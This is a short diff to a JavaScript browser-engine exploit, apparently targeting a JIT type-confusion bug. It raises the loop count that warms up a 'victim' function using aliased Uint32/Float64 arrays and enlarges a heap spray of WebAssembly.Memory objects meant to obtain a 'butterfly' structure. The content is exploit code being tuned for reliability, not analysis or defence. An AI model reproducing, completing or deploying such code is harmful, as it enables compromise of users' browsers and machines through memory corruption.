@@ -279,7 +279,7 @@ function exploit(){
         }
         let u32 = new Uint32Array(4);
         let f64 = new Float64Array(u32.buffer); 
-        for(let i=0; i<10000; i++) victim(s,f64,u32,confuse);
+        for(let i=0; i<100000; i++) victim(s,f64,u32,confuse);
         hack = 1;
         victim(s,f64,u32,confuse);
             
@@ -299,7 +299,7 @@ function exploit(){
         }
         
         log('[*] Spraying structures to get a butterfly (2/2)...');
-        for (var i = 0; i < 1000; i++) {
+        for (var i = 0; i < 5000; i++) {
             var a = new WebAssembly.Memory({inital: 0});
             a['prop' + i] = 1337;
             structs.push(a);
